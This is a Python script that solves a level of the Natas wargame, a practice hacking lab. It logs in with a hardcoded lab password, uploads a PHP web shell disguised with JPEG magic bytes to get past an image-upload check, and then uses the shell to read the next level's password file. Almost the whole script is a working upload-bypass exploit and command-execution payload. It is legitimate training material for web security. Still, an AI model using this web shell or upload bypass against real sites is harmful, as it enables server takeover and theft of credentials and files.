import requests
from bs4 import BeautifulSoup

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
url = "http://{}.natas.labs.overthewire.org/".format(username)

# MiME JPEG '\xFF\xD8\xFF\xE0'
file = {'uploadedfile': b'\xFF\xD8\xFF\xE0' + b'<?php echo shell_exec($_REQUEST["cmd"]); ?>'}
session = requests.Session()
data = {'filename': 'icyb3r.php', 'MAX_FILE_SIZE': '1000'}

r = session.post(url, data=data, files=file, auth=(username, password))

bs = BeautifulSoup(r.text, 'lxml')
text = bs.find_all('a')
shellpath = text[0].text

data = {'cmd': 'less /etc/natas_webpass/natas14'}

url = "http://{}.natas.labs.overthewire.org/{}".format(username, shellpath)
r1 = session.post(url, data=data, auth=(username, password))

print("natas14: " + r1.text[4:])
